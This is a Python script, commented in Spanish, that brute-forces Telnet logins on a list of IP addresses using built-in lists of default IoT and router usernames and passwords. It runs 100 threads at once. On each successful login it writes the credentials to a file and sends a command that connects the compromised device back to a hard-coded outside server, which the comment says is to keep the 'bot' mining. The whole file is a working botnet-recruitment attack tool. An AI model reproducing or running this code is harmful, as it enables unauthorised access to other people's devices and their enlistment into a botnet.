import telnetlib
import concurrent.futures
import socket
import time

PORT = 23
MAX_WORKERS = 100  # Ajusta según tu CPU y red

# Lista de usuarios comunes
users = [
    "root","admin","user","guest","test","support","operator","pi","ubnt","raspberry",
    "service","supervisor","administrator","admin1","root1","root2","admin2","root3","user1","user2",
    "default","manager","login","sysadmin","tech","cisco","netgear","dlink","tplink","mikrotik",
    "1234","system","backup","engineer","monitor","remote","home","office","security","iot",
    "printer","nas","server","cam","camera","voip","modem","switch","firewall","router","proxy"
]

# Lista de contraseñas comunes
passwords = [
    "root","admin","1234","12345","123456","1234567","12345678","123456789","password","pass",
    "admin123","1234admin","admin1234","guest","guest123","qwerty","123123","abc123","user","user123",
    "1","1111","0000","4321","87654321","9999","1234567890","default","changeme","system",
    "support","admin1","root1","root123","test","test123","password1","p@ssw0rd","supervisor","service",
    "cisco","netgear","tplink","dlink","mikrotik","pi","raspberry","camera","123",""
]

def cargar_lista(archivo):
    with open(archivo, 'r') as f:
        return [line.strip() for line in f if line.strip()]

# Si quieres cargar IPs desde archivo
ips = cargar_lista("ips_telnet.txt")

# Crear todas las combinaciones
combos = [(ip, user, pwd) for ip in ips for user in users for pwd in passwords]

def intentar_login(combo):
    ip, user, pwd = combo
    try:
        tn = telnetlib.Telnet(ip, PORT, timeout=5)

        prompt = tn.read_until(b":", timeout=3).lower()
        if b"login" in prompt or b"user" in prompt:
            tn.write(user.encode('ascii') + b"\n")
        else:
            tn.close()
            return False

        prompt_pass = tn.read_until(b":", timeout=3).lower()
        if b"password" in prompt_pass:
            tn.write(pwd.encode('ascii') + b"\n")
        else:
            tn.close()
            return False

        time.sleep(1)
        response = tn.read_very_eager().decode('ascii', errors='ignore').lower()

        if all(x not in response for x in ["incorrect", "failed", "denied", "invalid", "login:"]):
            print(f"[+] Éxito: {ip} | {user} / {pwd}")
            with open("credenciales_exitosas.txt", "a") as f:
                f.write(f"{ip} {user} {pwd}\n")

            # Conectar el bot al servidor en segundo plano para seguir minando
            try:
                tn.write(b"telnet 89.168.116.14 9999 &\n")
                time.sleep(1)
            except Exception as e:
                print(f"[-] Error al conectar {ip} al servidor: {e}")

            tn.close()
            return True

        tn.close()
        return False

    except (socket.timeout, ConnectionRefusedError, EOFError, OSError):
        return False
    except Exception as e:
        print(f"[-] Error inesperado {ip} {user}:{pwd} - {e}")
        return False

if __name__ == "__main__":
    start = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        list(executor.map(intentar_login, combos))
    print(f"[*] Terminado en {time.time() - start:.2f}s")
